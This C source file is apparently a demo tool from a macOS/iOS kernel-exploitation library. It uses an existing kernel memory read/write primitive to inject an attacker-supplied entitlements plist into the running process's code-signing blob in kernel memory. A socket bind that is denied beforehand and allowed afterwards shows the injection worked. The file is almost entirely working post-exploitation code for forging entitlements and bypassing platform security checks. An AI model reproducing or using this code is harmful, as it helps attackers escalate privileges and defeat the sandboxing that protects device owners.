//
//  main.c
//  demo_entitlements
//
//  Created by admin on 2/18/22.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <limits.h>
#include <spawn.h>
#include <signal.h>
#include <crt_externs.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOSurface/IOSurface.h>
#include <Kernel/kern/cs_blobs.h>

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>
#include <xe/xnu/proc.h>
#include <xe/iokit/io_surface.h>
#include <xe/iokit/os_dictionary.h>
#include <xe/util/ptrauth.h>
#include <xe/util/log.h>
#include <xe/util/assert.h>
#include <xe/util/kfunc.h>
#include <xe/util/binary.h>
#include <xe/allocator/small_mem.h>

#include "core_entitlements.h"


void print_usage(void) {
    xe_log_info("usage: demo_entitlements <path-to-kmem> <path-to-entitlement-plist> <cmd> [arg1] [arg2] ...");
}


CFDictionaryRef parse_entitlement_plist(const char* plist_path) {
    CFStringRef path_str = CFStringCreateWithCString(kCFAllocatorDefault, plist_path, kCFStringEncodingUTF8);
    xe_assert(path_str != NULL);
    
    CFURLRef path = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, path_str, kCFURLPOSIXPathStyle, FALSE);
    if (!path) {
        xe_log_error("invalid path %s", plist_path);
        exit(1);
    }
    
    CFReadStreamRef stream = CFReadStreamCreateWithFile(kCFAllocatorDefault, path);
    if (!stream || !CFReadStreamOpen(stream)) {
        xe_log_error("cannot open plist file at path %s", plist_path);
        exit(1);
    }
    
    CFErrorRef parse_error;
    CFDictionaryRef dict = CFPropertyListCreateWithStream(kCFAllocatorDefault, stream, 0, 0, NULL, &parse_error);
    if (!dict) {
        xe_log_error("failed to parse entitlement plist, err: %s", CFStringGetCStringPtr(CFErrorCopyDescription(parse_error), kCFStringEncodingUTF8));
        CFRelease(parse_error);
        exit(1);
    }
    
    CFReadStreamClose(stream);
    CFRelease(stream);
    CFRelease(path_str);
    CFRelease(path);
    return dict;
}


uintptr_t get_proc_cs_blobs(uintptr_t proc) {
    uintptr_t textvp = xe_ptrauth_strip(xe_kmem_read_uint64(proc, TYPE_PROC_MEM_P_TEXTVP_OFFSET));
    uintptr_t ubc_info = xe_ptrauth_strip(xe_kmem_read_uint64(textvp, TYPE_VNODE_MEM_VN_UN_OFFSET));
    uintptr_t cs_blobs = xe_kmem_read_uint64(ubc_info, TYPE_UBC_INFO_MEM_CS_BLOBS_OFFSET);
    return cs_blobs;
}


void assign_entitlements(xe_util_kfunc_t kfunc, uintptr_t proc, CFDictionaryRef entitlements) {
    uintptr_t cs_blob = get_proc_cs_blobs(proc);
    
    CFDataRef cs_der_data;
    uint64_t ce_res = CESerializeCFDictionary(CECRuntime, entitlements, &cs_der_data);
    if (ce_res != kCENoError) {
        xe_log_error("failed to serialize provided entitlements plist");
        exit(1);
    }
    
    size_t cs_der_blob_size = offsetof(CS_GenericBlob, data) + CFDataGetLength(cs_der_data);
    CS_GenericBlob* cs_der_blob = malloc(cs_der_blob_size);
    cs_der_blob->magic = htonl(CSMAGIC_EMBEDDED_DER_ENTITLEMENTS);
    cs_der_blob->length = htonl(cs_der_blob_size);
    memcpy(cs_der_blob->data, CFDataGetBytePtr(cs_der_data), CFDataGetLength(cs_der_data));
    
    uintptr_t cs_der_entitlements_blob = xe_allocator_small_allocate_disowned(cs_der_blob_size);
    xe_kmem_write(cs_der_entitlements_blob, 0, cs_der_blob, cs_der_blob_size);
    
    uintptr_t temp_buffer;
    xe_allocator_small_mem_t temp_allocator = xe_allocator_small_mem_allocate(8, &temp_buffer);
    
    uint64_t kfunc_args[8];
    bzero(kfunc_args, sizeof(kfunc_args));
    xe_kmem_write_uint64(temp_buffer, 0, 0);
    kfunc_args[0] = temp_buffer;
    kfunc_args[1] = xe_kmem_read_uint64(cs_blob, TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET) + TYPE_CS_HASH_MEM_CS_SIZE_OFFSET;
    kfunc_args[2] = sizeof(size_t);
    xe_util_kfunc_exec(kfunc, xe_slider_kernel_slide(FUNC_ML_NOFAULT_COPY_ADDR), kfunc_args);
    
    xe_kmem_write_uint64(temp_buffer, 0, cs_der_entitlements_blob);
    kfunc_args[0] = temp_buffer;
    kfunc_args[1] = cs_blob + TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET;
    kfunc_args[2] = sizeof(uint64_t);
    xe_util_kfunc_exec(kfunc, xe_slider_kernel_slide(FUNC_ML_NOFAULT_COPY_ADDR), kfunc_args);
    
    xe_allocator_small_mem_destroy(&temp_allocator);
    CFRelease(cs_der_data);
}


int main(int argc, const char * argv[]) {
    if (argc < 2) {
        xe_log_error("invalid arguments");
        print_usage();
        exit(1);
    }
    
    xe_kmem_backend_t remote = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(remote);
    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(remote));
    
    int fd = socket(PF_INET, SOCK_STREAM, 0);
    xe_assert_errno(fd < 0);
    
    struct sockaddr_in addr;
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_len = sizeof(addr);
    addr.sin_port = htons(55555);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    int res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
    if (res) {
        xe_log_info("bind failed as expected, err: %s", strerror(errno));
    } else {
        xe_log_error("bind succeeded without entitlement");
        exit(1);
    }
    
    CFDictionaryRef plist = parse_entitlement_plist("entitlements.plist");
    xe_util_kfunc_t kfunc = xe_util_kfunc_create(VAR_ZONE_ARRAY_LEN - 1);
    assign_entitlements(kfunc, xe_xnu_proc_current_proc(), plist);
        
    res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
    if (res) {
        xe_log_error("bind failed after adding entitlement");
        exit(1);
    } else {
        xe_log_info("bind succeded after adding entitlement");
    }
    
    close(fd);
    xe_util_kfunc_destroy(&kfunc);
    return 0;
}
